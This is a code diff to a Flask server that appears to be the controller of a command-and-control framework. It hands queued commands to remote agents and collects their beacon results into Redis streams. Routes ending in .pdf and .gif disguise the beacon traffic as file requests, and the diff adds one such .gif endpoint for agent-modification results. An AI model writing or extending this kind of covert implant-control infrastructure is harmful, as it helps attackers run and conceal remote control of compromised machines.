@@ -117,7 +117,7 @@ class FlaskApplication:
                 return jsonify(error="Commands must be a list"), 400
 
             if results and commands:
-                self._redis_push_results(results, commands)
+                self._redis_push_results(results, commands, f"{self.domain}:results")
                 return jsonify(status="received"), 200
             else:
                 return jsonify(
@@ -174,7 +174,7 @@ class FlaskApplication:
                 return jsonify(error="Commands must be a list"), 400
 
             if results and commands:
-                self._redis_push_results(results, commands)
+                self._redis_push_results(results, commands, f"{self.domain}:results")
                 return jsonify(status="received"), 200
             else:
                 return jsonify(status="no results or commands provided"), 404
@@ -184,7 +184,9 @@ class FlaskApplication:
         @self.app.route("/<path:filename>.pdf", methods=["GET"])
         def handle_agent_modification_command_request(filename):
             # Get agent modification commands if they are available
-            commands = command.get_queued_agent_modification_commands(self.domain, self.redis_client)
+            commands = command.get_queued_agent_modification_commands(
+                self.domain, self.redis_client
+            )
 
             if commands:
                 # Decode bytes to strings if needed
@@ -205,6 +207,31 @@ class FlaskApplication:
                 # TODO: IN the future this can implement a timer of shorts that is sent back
                 return jsonify(status="No data available"), 404
 
+        @self.app.route("/<path:filename>.gif", methods=["POST"])
+        def handle_anent_modificatn_command_results(filename):
+            """Used as the endpoint for beacon response messages, including the outputs of commands"""
+            # TODO: Verify the nonce of the endpoint/obfuscation/encryption
+
+            data = request.get_json()
+            results = data.get("results")
+            commands = data.get("commands")
+
+            # Ensure that results is a list and not another python iterable (string)
+            if not isinstance(results, list):
+                return jsonify(error="Results must be a list"), 400
+            if not isinstance(commands, list):
+                return jsonify(error="Commands must be a list"), 400
+
+            if results and commands:
+                self._redis_push_results(
+                    results, commands, f"{self.domain}:mod_results"
+                )
+                return jsonify(status="received"), 200
+            else:
+                return jsonify(
+                    status="no results or commands provided",
+                )
+
         @self.app.route("/results", methods=["POST"])
         def reportChunk():
             """
@@ -218,12 +245,13 @@ class FlaskApplication:
             # Return status required for Flask
             return jsonify(status="ok"), 200
 
-    def _redis_push_results(self, results, commands):
-        # Ensure that the data type is a list and not another python iterable (string)
-
+    def _redis_push_results(self, results, commands, stream_key):
+        """
+        Pushes results and commands for both the execution commands and the agent modification commands.
+            -stream_key is the respective redis stream that these commands should be passed into
+        """
         try:
             for i in range(len(results)):
-                stream_key = f"{self.domain}:results"
                 self.redis_client.xadd(
                     stream_key,
                     {
